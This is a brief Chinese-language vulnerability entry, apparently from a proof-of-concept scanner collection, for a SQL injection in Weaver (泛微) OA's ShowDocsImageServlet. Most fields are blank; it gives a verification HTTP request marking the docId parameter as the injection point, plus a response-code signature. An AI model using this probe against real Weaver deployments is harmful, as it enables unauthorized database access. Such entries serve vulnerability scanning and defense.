﻿# 泛微 OD ShowDocsImagesql注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Accept-Encoding: gzip, deflate
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：泛微 OD ShowDocsImagesql注入漏洞.poc
